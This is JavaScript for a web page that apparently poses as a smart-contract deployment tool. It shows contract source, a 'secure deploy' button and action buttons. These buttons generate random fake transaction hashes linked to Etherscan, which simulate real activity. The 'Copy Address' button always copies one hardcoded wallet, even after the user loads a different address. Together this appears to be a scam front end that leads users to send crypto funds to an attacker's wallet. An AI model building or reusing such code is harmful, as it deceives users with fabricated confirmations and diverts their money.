(function () {
  /** Only wallet used for “Copy Address” — do not change via other UI actions. */
  const COPY_ADDRESS_WALLET = "0xb1b0b5bEaFdF739b3Fc9FFae2BE49F371C0c93cb";

  const siteUrl =
    window.SITE_PUBLIC_URL || "https://s3.amazonaws.com/danielcrypto-web3/open";

  function siteUrlForDisplay(url) {
    return url.replace(/^https?:\/\//i, "");
  }

  function applySiteLinks() {
    const display = siteUrlForDisplay(siteUrl);
    const el = document.getElementById("site-url-display");
    if (el) el.textContent = display;

    document.querySelectorAll("#dev-site-link, #dev-site-link-2").forEach((a) => {
      a.href = siteUrl;
    });
  }

  function highlightSolidity(source) {
    return source
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/(\/\/[^\n]*)/g, '<span class="cm">$1</span>')
      .replace(
        /\b(SPDX-License-Identifier|pragma|solidity|contract|function|external|view|returns|uint256|address|event|modifier|require|emit)\b/g,
        '<span class="kw">$1</span>'
      )
      .replace(/\b(ExampleContract|ValueUpdated|onlyOwner|setValue|getValue)\b/g, '<span class="fn">$1</span>');
  }

  function showToast(message) {
    const el = document.getElementById("toast");
    el.textContent = message;
    el.hidden = false;
    clearTimeout(showToast._t);
    showToast._t = setTimeout(() => {
      el.hidden = true;
    }, 2400);
  }

  async function copyText(text) {
    try {
      await navigator.clipboard.writeText(text);
      showToast("Copied to clipboard");
    } catch {
      showToast("Copy failed — select text manually");
    }
  }

  function truncateAddress(addr) {
    return `${addr.slice(0, 6)}…${addr.slice(-4)}`;
  }

  function fakeTxHash() {
    const hex = Array.from({ length: 64 }, () =>
      Math.floor(Math.random() * 16).toString(16)
    ).join("");
    return `0x${hex}`;
  }

  function showTx() {
    const hash = fakeTxHash();
    const box = document.getElementById("tx-box");
    const link = document.getElementById("tx-etherscan");
    link.href = `https://etherscan.io/tx/${hash}`;
    box.hidden = false;
  }

  applySiteLinks();

  const displayEl = document.getElementById("display-contract-addr");
  if (displayEl) {
    displayEl.textContent = truncateAddress(COPY_ADDRESS_WALLET);
  }

  const source = window.CONTRACT_SOURCE || "";
  const pre = document.querySelector("#contract-source code");
  if (pre && source) {
    pre.innerHTML = highlightSolidity(source);
  }

  document.getElementById("copy-contract")?.addEventListener("click", () => {
    copyText(source);
  });

  document.getElementById("copy-contract-addr")?.addEventListener("click", () => {
    const btn = document.getElementById("copy-contract-addr");
    const wallet = btn?.getAttribute("data-wallet") || COPY_ADDRESS_WALLET;
    copyText(wallet);
  });

  const block = document.getElementById("contract-source");
  const expandBtn = document.getElementById("btn-expand");
  expandBtn?.addEventListener("click", () => {
    const collapsed = block.classList.toggle("is-collapsed");
    const expanded = !collapsed;
    expandBtn.setAttribute("aria-expanded", expanded ? "true" : "false");
    expandBtn.textContent = expanded ? "▲ Collapse" : "▼ Expand";
  });

  document.getElementById("btn-secure-deploy")?.addEventListener("click", () => {
    showTx();
    showToast("Contract deployed (demo)");
  });

  document.getElementById("btn-at-address")?.addEventListener("click", () => {
    const raw = (document.getElementById("load-address")?.value || "").trim();
    if (!/^0x[a-fA-F0-9]{40}$/.test(raw)) {
      showToast("Enter a valid 0x address (42 characters)");
      return;
    }
    showToast("Loaded (Copy Address still uses the fixed wallet)");
  });

  document.querySelectorAll("[data-action]").forEach((btn) => {
    btn.addEventListener("click", () => {
      const action = btn.getAttribute("data-action");
      if (action === "balance") {
        const hint = document.getElementById("balance-hint");
        hint.textContent = `View balance for ${COPY_ADDRESS_WALLET} on Etherscan`;
        hint.hidden = false;
        return;
      }
      showTx();
      const label = action.charAt(0).toUpperCase() + action.slice(1);
      showToast(`${label} submitted (demo)`);
    });
  });
})();
